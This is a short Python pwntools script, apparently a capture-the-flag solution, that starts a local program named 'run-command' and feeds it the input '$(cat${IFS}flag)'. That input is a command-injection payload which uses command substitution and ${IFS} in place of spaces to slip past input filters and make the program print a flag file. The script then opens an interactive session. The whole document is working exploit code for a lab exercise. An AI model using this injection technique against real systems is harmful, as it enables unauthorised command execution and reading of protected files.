from pwn import *

p = process("./run-command")

data = "$(cat${IFS}flag)"

p.sendline(data)

p.interactive()
